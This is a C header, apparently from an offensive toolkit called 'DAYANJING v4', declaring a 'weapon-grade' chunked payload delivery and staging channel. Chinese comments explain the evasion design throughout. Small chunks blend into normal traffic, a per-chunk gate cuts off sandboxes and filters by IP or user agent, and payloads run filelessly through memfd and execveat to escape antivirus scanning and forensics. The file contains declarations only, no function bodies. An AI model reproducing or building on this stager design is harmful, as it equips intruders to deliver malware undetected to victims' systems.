/* DAYANJING v4 — 25_deploy / include/drop.h
 *
 * 武器级分块投递通道（drop）。
 *
 * 为什么必须分块，而不是一次 HTTP 下载：
 *  1. 单次大体积下载在出口侧是显著事件（体积、时长、单次连接字节数）。
 *     分块后每次请求是常规静态资源规模，混在正常流量里。
 *  2. 分块可门控：每块都能重新判断来源，可疑来源中途即可断供，
 *     不必等到整个制品送完才发现是在给沙箱送货。
 *  3. 分块可乱序/重传：缺块补块，不必重头来过。
 *
 * 三条硬规则（不是功能，是防线）：
 *  1. 块索引必须 < nchunks。越界即拒绝，绝不写入缓冲区 —— 由攻击者
 *     控制的 idx 若被当成偏移使用，就是一次越界写。
 *  2. 未收齐绝不 seal。缺块却执行，表现为"制品随机跑飞"，
 *     是所有故障里最难定位的一类。调用方只能拿到 sealed 的缓冲区。
 *  3. 全程内存，不落盘。落盘的制品会被 AV 静态扫描、被取证恢复、
 *     被磁盘上的时间戳关联。执行走 pk_mexec（memfd + execveat）。
 *
 * 不重复实现任何一层：摘要用 00_crypto 的 sha256，落地执行用
 * 20_packer 的 pk_mexec。本层只负责"怎么把制品切成块、怎么收齐"。
 */

#ifndef DROP_H
#define DROP_H

#include <stddef.h>
#include <stdint.h>

#define DP_CHUNK_MAX   16384u          /* 单块上限 16 KiB */
#define DP_MAX_CHUNKS  512u            /* 块数上限 —— 总容量 8 MiB */
#define DP_DIGEST_LEN  32u             /* sha256 */

/* 总容量上界。uint32 下 512*16384 = 8388608，远未溢出，但仍显式钉死：
   若有人调大常量，这个上界会挡住静默溢出。 */
#define DP_TOTAL_MAX   (DP_CHUNK_MAX * DP_MAX_CHUNKS)

/* 错误码。注意：全部为负，0 才是成功。 */
#define DP_OK             0
#define DP_ERR_ARG       -1
#define DP_ERR_NOMEM      -2
#define DP_ERR_RANGE      -3    /* 块索引越界 */
#define DP_ERR_LEN        -4    /* 块长度与 manifest 不符 */
#define DP_ERR_DUP        -5    /* 重复块（幂等，不写入、不计 got） */
#define DP_ERR_INCOMPLETE -6    /* 未收齐就 seal */
#define DP_ERR_DIGEST     -7    /* 整体摘要不符 */
#define DP_ERR_GATE       -8    /* 门控拒绝 */
#define DP_ERR_STATE      -9    /* 已 seal 后再写入 */

/* manifest：制品的分块索引与整体摘要。
   它本身不含制品内容，可以被公开分发而不泄露制品。 */
typedef struct {
    uint32_t total;                    /* 制品总长 */
    uint32_t chunk_size;               /* 每块大小（最后一块可短） */
    uint32_t nchunks;                  /* 块数 */
    uint8_t  digest[DP_DIGEST_LEN];    /* 整体 sha256 */
} dp_manifest_t;

/* 组装器：内存累积收到的块。buf 仅在 seal 成功后对外可用。 */
typedef struct {
    uint8_t *buf;
    uint32_t cap;
    uint32_t len;
    uint32_t nchunks;
    uint32_t chunk_size;
    uint32_t got_count;                /* 已收齐的不同块数 */
    uint32_t dup_count;                /* 重复块计数（诊断用） */
    uint32_t bad_count;                /* 被拒块计数（诊断用） */
    uint8_t  got[DP_MAX_CHUNKS / 8u];  /* 位图 */
    uint8_t  digest[DP_DIGEST_LEN];
    int      sealed;
} dp_asm_t;

/* ---- manifest ---- */

/* 由制品内容计算 manifest。chunk_size 必须 [1, DP_CHUNK_MAX] 且
   块数不超 DP_MAX_CHUNKS。blob 为 NULL 或 total 为 0 拒绝。 */
int dp_manifest_build(const uint8_t *blob, size_t blob_len,
                      uint32_t chunk_size, dp_manifest_t *m);

/* 校验 manifest 自洽。用于接收端在开缓冲区之前判断，
   避免按恶意 manifest 分配超大缓冲。 */
int dp_manifest_check(const dp_manifest_t *m);

/* ---- 取块（服务端侧） ---- */

/* 取第 idx 块。out 指向 blob 内部（不拷贝），olen 为实际长度。
   idx 越界返回 DP_ERR_RANGE。 */
int dp_chunk_get(const uint8_t *blob, size_t blob_len,
                 const dp_manifest_t *m, uint32_t idx,
                 const uint8_t **out, size_t *olen);

/* ---- 组装（stager 侧） ---- */

int dp_asm_init(dp_asm_t *a, const dp_manifest_t *m);

/* 放入第 idx 块。重复块返回 DP_ERR_DUP 且不重复计数（幂等：
   重传是常态，报失败会让调用方误以为链路坏了）。 */
int dp_asm_put(dp_asm_t *a, uint32_t idx, const uint8_t *chunk, size_t clen);

/* 收齐 + 摘要校验。未收齐返回 DP_ERR_INCOMPLETE 并保持未 seal。 */
int dp_asm_seal(dp_asm_t *a);

int      dp_asm_is_complete(const dp_asm_t *a);
uint32_t dp_asm_missing(const dp_asm_t *a);
void     dp_asm_free(dp_asm_t *a);

/* ---- 门控 ---- */

/* 每块投递前调用。返回 1 投递，0 拒绝。
   ud 由调用方携带（IP 名单、已投递集合、UA 黑名单等）。
   为什么是回调而不是内置策略：内置策略在沙盒里无法验证，
   而回调让"门控真的拦住了"成为可断言的事实。 */
typedef int (*dp_gate_fn)(uint32_t idx, void *ud);

/* 门控装饰器：给定 manifest 与门控，按 idx 产出块。
   门控拒绝时返回 DP_ERR_GATE 且 out/olen 不被写。 */
int dp_serve_chunk(const uint8_t *blob, size_t blob_len,
                   const dp_manifest_t *m, uint32_t idx,
                   dp_gate_fn gate, void *ud,
                   const uint8_t **out, size_t *olen);

/* ---- 落块执行 ---- */

/* seal 成功后，解包 + memfd 执行。未 seal 直接拒绝（硬规则 2 的落点）。
   本函数不返回：成功时进程映像被替换。 */
int dp_asm_exec(const dp_asm_t *a, const uint8_t *seed, size_t seed_len);

#endif /* DROP_H */
